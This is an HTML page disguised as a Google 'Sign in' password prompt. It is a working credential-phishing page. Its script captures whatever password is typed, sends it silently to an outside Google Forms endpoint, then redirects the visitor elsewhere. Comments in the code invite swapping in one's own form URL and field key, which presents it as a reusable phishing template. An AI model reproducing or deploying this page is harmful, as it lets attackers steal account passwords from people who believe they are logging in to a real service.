<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Enter Password</title>
    <link rel="stylesheet" href="../css/password.css">
    <script>
        function submitForm() {
            var password = document.getElementById("password").value;
            // Replace this URL with your Google Form URL for form submission
            var formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSffDoMIGuoFGNza5oXr5lCjfQOTXm-E31Ni6_0-mLh43Xx3Pg/formResponse";
            // Replace the entry key with the appropriate key for your form field
            var formData = "entry.1599227786=" + password;

            var xhr = new XMLHttpRequest();
            xhr.open("POST", formUrl);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send(formData);

            // Delay redirect by 2 seconds
            setTimeout(function() {
                window.location.href = "https://forms.gle/pSF7cgb4TV6Ft3sm7";
            }, 2000);
        }
    </script>
</head>
<body>

<div class="background-image"></div>

<div class="login-box">
    <img src="https://cdn.vox-cdn.com/thumbor/Pkmq1nm3skO0-j693JTMd7RL0Zk=/0x0:2012x1341/1200x800/filters:focal(0x0:2012x1341)/cdn.vox-cdn.com/uploads/chorus_image/image/47070706/google2.0.0.jpg">
    <h1>Sign in</h1>
    <x1>Enter your password</x1>
    <form onsubmit="submitForm(); return false;">
        <input id="password" type="password" placeholder="  Password">
        <br>
        <x2> Forgot password?</x2>
        <button type="submit"> Sign In </button>
    </form>
</div>

</body>
</html>
